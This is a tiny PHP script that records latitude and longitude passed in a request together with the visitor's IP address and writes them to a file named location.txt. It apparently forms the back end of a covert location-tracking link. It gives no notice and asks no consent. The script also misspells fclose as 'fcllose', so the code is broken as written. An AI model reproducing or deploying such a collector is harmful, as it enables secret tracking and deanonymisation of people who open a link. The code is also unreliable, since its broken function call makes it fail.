<?php

$myfile = fopen("location.txt", "w");
$txt = "lat: " . $_GET["lat"] . " ; long: " . $_GET["long"] . " ; ip: " . $_SERVER["REMOTE_ADDR"];
fwrite($myfile, $txt);
fcllose($myfile);
?>
